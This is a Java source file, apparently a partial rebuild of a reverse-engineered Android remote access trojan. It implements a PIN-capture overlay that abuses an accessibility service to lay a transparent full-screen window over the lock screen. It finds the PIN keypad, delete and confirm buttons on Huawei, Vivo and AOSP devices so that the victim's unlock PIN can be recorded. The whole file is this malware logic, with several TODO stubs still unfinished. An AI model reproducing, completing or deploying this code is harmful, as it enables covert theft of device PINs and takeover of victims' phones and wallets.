package com.vendor.rat.helper;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;

import com.vendor.rat.auto.condition.BoolCondition;
import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.Point;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * PIN码采集覆盖层
 *
 * 基于逆向: com/guard/wallet/helper/r.java (428行)
 * - 创建全屏透明覆盖层拦截触摸事件
 * - 查找并缓存 PIN 键盘按键节点
 * - 厂商适配: Huawei/Vivo/Samsung/AOSP
 */
public abstract class PinCaptureOverlay {

    private static final String TAG = "PinCaptureOverlay";

    // ADAPT: vendor f166a — WindowManager 引用
    public static WindowManager windowManager;

    // ADAPT: vendor f168e — 当前监听请求
    // TODO: VENDOR_VERIFY — ReqListenHelper 尚未复刻，暂用 Object 占位
    public static Object listenRequest;

    // ADAPT: vendor b — 触摸覆盖层 View 引用
    public static final AtomicReference<View> touchViewRef = new AtomicReference<>();

    // ADAPT: vendor c — PIN码数据插件 (com.guard.wallet.plug.f)
    // TODO: VENDOR_VERIFY — plug.f 类尚未复刻

    // ADAPT: vendor f167d — 并发锁
    public static final ReentrantLock lock = new ReentrantLock();

    // ADAPT: vendor f169f — 当前状态码
    public static Integer stateCode = -1;

    // ADAPT: vendor f170g — 缓存的按键节点队列
    public static final ConcurrentLinkedQueue<UiNode> cachedKeyNodes =
            new ConcurrentLinkedQueue<>();

    // ADAPT: vendor f171h — 删除按钮节点
    public static final AtomicReference<UiNode> deleteButtonRef =
            new AtomicReference<>(null);

    // ADAPT: vendor f172i — 预留引用
    public static final AtomicReference<UiNode> reservedRef =
            new AtomicReference<>(null);

    // ADAPT: vendor f173j — 确认按钮节点
    public static final AtomicReference<UiNode> confirmButtonRef =
            new AtomicReference<>(null);

    static {
        Executors.newFixedThreadPool(10);
    }

    // ============ Filter 工厂方法 ============

    /** ADAPT: vendor a() — AOSP delete_button */
    public static CombineFilter aospDeleteFilter() {
        return CombineFilter.and(
                new BoolCondition(BoolCondition.Property.CLICKABLE, true),
                StringCondition.viewIdContains("com.android.systemui:id/delete_button"));
    }

    /** ADAPT: vendor b() — AOSP key_enter */
    public static CombineFilter aospConfirmFilter() {
        return CombineFilter.and(
                new BoolCondition(BoolCondition.Property.CLICKABLE, true),
                StringCondition.viewIdContains("com.android.systemui:id/key_enter"));
    }

    /** ADAPT: vendor c() — AOSP key (ViewGroup) */
    public static CombineFilter aospKeyFilter() {
        return CombineFilter.and(
                new BoolCondition(BoolCondition.Property.CLICKABLE, true),
                StringCondition.className("android.view.ViewGroup"),
                StringCondition.viewIdContains("com.android.systemui:id/key"));
    }

    /** ADAPT: vendor l() — 华为删除 (desc="删除") */
    public static CombineFilter huaweiDeleteFilter() {
        return CombineFilter.and(
                new BoolCondition(BoolCondition.Property.CLICKABLE, true),
                StringCondition.className("android.view.View"),
                StringCondition.descEquals("删除"));
    }

    /** ADAPT: vendor m() — 华为数字键 (desc匹配\\d) */
    public static CombineFilter huaweiKeyFilter() {
        // TODO: VENDOR_VERIFY — vendor 使用 regex \\d 匹配 desc
        // replica StringCondition 无 regex 支持，使用自定义 NodeFilter
        return CombineFilter.and(
                new BoolCondition(BoolCondition.Property.CLICKABLE, true),
                StringCondition.className("android.view.View"),
                node -> {
                    String desc = node.getContentDescription();
                    return desc != null && desc.matches("\\d");
                });
    }

    /** ADAPT: vendor o() — Vivo 取消按钮 */
    public static CombineFilter vivoDeleteFilter() {
        return CombineFilter.and(
                new BoolCondition(BoolCondition.Property.CLICKABLE, true),
                StringCondition.viewId("com.android.systemui:id/vivo_cancel"));
    }

    /** ADAPT: vendor p() — Vivo 确认按钮 */
    public static CombineFilter vivoConfirmFilter() {
        return CombineFilter.and(
                new BoolCondition(BoolCondition.Property.CLICKABLE, true),
                StringCondition.viewId(
                        "com.android.systemui:id/vivo_pin_confirm"));
    }

    /** ADAPT: vendor q() — Vivo PIN键 (VivoPinkey) */
    public static CombineFilter vivoKeyFilter() {
        return CombineFilter.and(
                new BoolCondition(BoolCondition.Property.CLICKABLE, true),
                StringCondition.className("android.view.ViewGroup"),
                StringCondition.viewIdContains(
                        "com.android.systemui:id/VivoPinkey"));
    }

    // ============ 核心方法 ============

    /**
     * 创建触摸覆盖层 (主线程)
     * ADAPT: vendor d(o.e, CombineFilter)
     */
    public static void createTouchOverlay(UiNode rootNode,
            CombineFilter combineFilter) {
        try {
            if (touchViewRef.get() != null || listenRequest == null) {
                return;
            }
            // TODO: VENDOR_VERIFY — vendor 检查 listenType==1 && !g.p0()
            // TODO: VENDOR_VERIFY — vendor 检查 CrackLockCipherPlug 缓存

            stateCode = -1;
            cachedKeyNodes.clear();
            deleteButtonRef.set(null);
            reservedRef.set(null);
            confirmButtonRef.set(null);

            WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
            lp.flags = 4786090;
            lp.format = 1;
            lp.alpha = 1.0f;
            lp.dimAmount = 0.01f;
            lp.gravity = 8388659; // Gravity.START | Gravity.TOP
            lp.x = 0;
            lp.y = 0;
            // TODO: VENDOR_VERIFY — vendor 用 utils.e.e() 获取屏幕尺寸
            lp.width = WindowManager.LayoutParams.MATCH_PARENT;
            lp.height = WindowManager.LayoutParams.MATCH_PARENT;

            MyAccessibilityService svc = MyAccessibilityService.P();
            if (svc == null) return;

            View view = new View(svc);
            view.setBackgroundColor(0);
            view.setAlpha(1.0f);

            if (windowManager == null) {
                windowManager = (WindowManager) svc.getSystemService("window");
            }
            lp.type = 2032; // TYPE_ACCESSIBILITY_OVERLAY
            // TODO: VENDOR_VERIFY — vendor 设置 OnTouchListener (new q())

            if (touchViewRef.get() == null) {
                windowManager.addView(view, lp);
                touchViewRef.set(view);
                Log.e(TAG, "TouchView 已创建完成");
            }

            if (!cacheTouchNodes(rootNode, combineFilter)) {
                Log.e(TAG, "PIN码按键查找失败");
                stopPinListening(false);
                return;
            }
            if (deleteButtonRef.get() == null) findDeleteButton(rootNode);
            if (confirmButtonRef.get() == null) findConfirmButton(rootNode);
        } catch (Exception e) {
            Log.e(TAG, "createTouchOverlay error", e);
        }
    }

    /** ADAPT: vendor e() — 启动 PIN 码监听 */
    public static void startPinListening(UiNode rootNode,
            CombineFilter combineFilter, Object reqListenHelper) {
        try {
            if (MyAccessibilityService.P() == null || isActive()
                    || listenRequest != null) {
                return;
            }
            if (lock.tryLock()) {
                try {
                    listenRequest = reqListenHelper;
                    if (isMainThread()) {
                        createTouchOverlay(rootNode, combineFilter);
                    } else {
                        new Handler(Looper.getMainLooper()).post(
                                () -> createTouchOverlay(rootNode, combineFilter));
                        for (int i = 0; !isActive() && i < 10; i++) {
                            try {
                                Thread.sleep(1000);
                            } catch (InterruptedException ignored) {}
                        }
                    }
                } finally {
                    lock.unlock();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "startPinListening error", e);
        }
    }

    /** ADAPT: vendor f() — 销毁触摸覆盖层 */
    public static void destroyTouchOverlay() {
        try {
            if (windowManager != null && touchViewRef.get() != null) {
                touchViewRef.get().setOnTouchListener(null);
                windowManager.removeViewImmediate(touchViewRef.get());
                touchViewRef.set(null);
                Log.e(TAG, "TouchView 已销毁完成");
            }
            stateCode = -1;
            cachedKeyNodes.clear();
            deleteButtonRef.set(null);
            reservedRef.set(null);
            confirmButtonRef.set(null);
        } catch (Exception e) {
            Log.e(TAG, "destroyTouchOverlay error", e);
        }
    }

    /** ADAPT: vendor g(boolean) — 停止监听并提交/清理 */
    public static void stopPinListening(boolean submit) {
        try {
            if (!isActive()) return;
            if (lock.tryLock()) {
                try {
                    // TODO: VENDOR_VERIFY — plug.f 提交/清理逻辑
                    listenRequest = null;
                    if (isMainThread()) {
                        destroyTouchOverlay();
                    } else {
                        new Handler(Looper.getMainLooper()).post(
                                PinCaptureOverlay::destroyTouchOverlay);
                    }
                } finally {
                    lock.unlock();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "stopPinListening error", e);
        }
    }

    /** ADAPT: vendor h() — 按厂商查找删除按钮 */
    public static void findDeleteButton(UiNode rootNode) {
        try {
            CombineFilter filter;
            if (DeviceUtils.isHuawei()) {
                filter = huaweiDeleteFilter();
            } else if (DeviceUtils.isVivo()) {
                filter = vivoDeleteFilter();
            } else {
                filter = aospDeleteFilter();
            }
            UiNode found = findInRootOrCache(rootNode, filter);
            if (found != null) deleteButtonRef.set(found);
        } catch (Exception e) {
            Log.e(TAG, "findDeleteButton error", e);
        }
    }

    /** ADAPT: vendor i() — 按厂商查找确认按钮 */
    public static void findConfirmButton(UiNode rootNode) {
        try {
            CombineFilter filter;
            if (DeviceUtils.isHuawei()) {
                filter = null; // 华为无独立确认按钮
            } else if (DeviceUtils.isVivo()) {
                filter = vivoConfirmFilter();
            } else {
                filter = aospConfirmFilter();
            }
            if (filter != null) {
                UiNode found = findInRootOrCache(rootNode, filter);
                if (found != null) confirmButtonRef.set(found);
            }
        } catch (Exception e) {
            Log.e(TAG, "findConfirmButton error", e);
        }
    }

    /** ADAPT: vendor j() — 根据触摸坐标查找按键节点 */
    public static UiNode findKeyByPoint(UiNode rootNode, Point point) {
        try {
            // ADAPT: vendor 使用 PointCondition + findLastByCombine
            // replica 无 PointCondition filter 支持，暂用 clickable filter
            CombineFilter filter = CombineFilter.clickable();
            // TODO: VENDOR_VERIFY — 需要坐标匹配逻辑
            return findInRootOrCache(rootNode, filter);
        } catch (Exception e) {
            Log.e(TAG, "findKeyByPoint error", e);
            return null;
        }
    }

    /** ADAPT: vendor k() — 覆盖层是否激活 */
    public static boolean isActive() {
        return touchViewRef.get() != null;
    }

    /**
     * ADAPT: vendor n() — 查找并缓存 PIN 键盘按键 (期望10个)
     */
    public static boolean cacheTouchNodes(UiNode rootNode,
            CombineFilter combineFilter) {
        try {
            if (listenRequest == null) return false;

            CombineFilter keyFilter;
            if (DeviceUtils.isHuawei()) {
                keyFilter = huaweiKeyFilter();
            } else if (DeviceUtils.isVivo()) {
                keyFilter = vivoKeyFilter();
            } else {
                keyFilter = aospKeyFilter();
            }
            if (keyFilter == null) return false;

            for (int attempt = 0;
                    cachedKeyNodes.size() < 10 && attempt < 5; attempt++) {
                if (rootNode != null) rootNode.refresh();
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException ignored) {}

                cachedKeyNodes.clear();
                List<UiNode> found = null;
                if (rootNode != null) {
                    found = rootNode.findAllByCombine(keyFilter);
                }
                if (found == null || found.isEmpty()) {
                    UiNode cached = MyAccessibilityService.getCachedRoot();
                    if (cached != null) {
                        found = cached.findAllByCombine(keyFilter);
                    }
                }
                if (found != null && !found.isEmpty()) {
                    cachedKeyNodes.addAll(found);
                }
            }
            if (cachedKeyNodes.size() == 10) {
                Log.e(TAG, "PIN码按键查找成功");
                return true;
            }
            Log.e(TAG, "cacheTouchNodes not found");
            return false;
        } catch (Exception e) {
            Log.e(TAG, "cacheTouchNodes error", e);
            return false;
        }
    }

    // ============ 辅助 ============

    private static UiNode findInRootOrCache(UiNode rootNode,
            CombineFilter filter) {
        if (rootNode != null) {
            UiNode f = rootNode.findOneByCombine(filter);
            if (f != null) return f;
        }
        UiNode cached = MyAccessibilityService.getCachedRoot();
        if (cached != null) return cached.findOneByCombine(filter);
        return null;
    }

    private static boolean isMainThread() {
        return Looper.myLooper() == Looper.getMainLooper();
    }
}
